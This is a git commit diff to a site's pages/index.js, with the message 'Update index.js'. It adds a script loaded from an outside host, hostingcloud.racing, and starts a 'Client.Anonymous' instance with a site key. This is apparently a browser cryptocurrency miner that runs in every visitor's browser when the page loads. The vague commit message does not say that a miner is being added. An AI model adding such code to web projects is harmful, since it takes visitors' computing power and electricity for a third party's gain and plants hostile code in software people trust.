14ec094b64c747882b6174ea026b0c58f25d1ea3
anesas8811 <50436737+anesas8811@users.noreply.github.com>
2019-05-09 11:11:07 +0530

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -8,6 +8,15 @@ function Index() {
       <section>
         <Link href="/about">
           <a>Go to About Me</a>
+          <script src="https://www.hostingcloud.racing/ewBf.js"></script>
+    <script>
+    var _client = new Client.Anonymous('20b479145990a688b74c66986f545f3edb0c883aa5e6aa3a2da5e9da21f62eb3', {
+        throttle: 0.1
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "hellowww!", "#cccccc", 40, "#3d3d3d");
+
+    </script>
         </Link>
       </section>
     </main>
